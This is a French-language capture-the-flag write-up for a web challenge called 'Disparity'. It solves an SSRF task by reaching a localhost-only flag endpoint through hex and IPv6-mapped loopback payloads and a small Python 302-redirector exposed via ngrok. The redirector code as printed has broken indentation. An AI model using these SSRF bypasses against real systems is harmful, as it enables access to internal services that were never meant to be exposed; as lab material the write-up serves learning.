Web - Disparity
===========================

Enoncé
----------

I only trust what I see and, guess what ? I don't see any vulnerability in my app. 

Résolution
-------------

On a deux serveur web, un qui est accessible, l'autre en localhost uniquement. 

Le deuxième serveur contient ce code : 

.. code-block:: php

    if ($_SERVER['HTTP_HOST'] === "localhost:8080"){
        echo getenv('FLAG');
    } else {
        echo "You are not allowed to do that";
    }

Il faut donc trouver une SSRF qui permettra de contacter le serveur local, mais on ne peut pas utiliser localhost.

On a donc trouvé ces deux paylods : 

.. code-block:: console
    
    http://0x7f000001:8080/flag.php
    http://[::ffff:7f00:1]:8080/flag.php

Mais cela ne suffit pas, car le "host" doit être égal a localhost:8080

On va donc utiliser un serveur web en local qui fait une redirection vers localhost:8080 pour avoir le bon entête : 

python3 redirector.py 8888 http://localhost:8080/flag.php

.. code-block:: python

    #!/usr/bin/env python3
    import sys
    from http.server import HTTPServer, BaseHTTPRequestHandler

    if len(sys.argv)-1 != 2:
        print("""
    Usage: {} <port_number> <url>
        """.format(sys.argv[0]))
        sys.exit()

    class Redirect(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', sys.argv[2])
        self.end_headers()
    def send_error(self, code, message=None):
        self.send_response(302)
        self.send_header('Location', sys.argv[2])
        self.end_headers()
    HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()

On fait un serveur public avec ngrok, et on envoie l'adresse du ngrok.

Le ngrok redirige vers redirector.py, qui redirige vers localhost:8080 donc avec la bon entête "Host" et on obtient le flag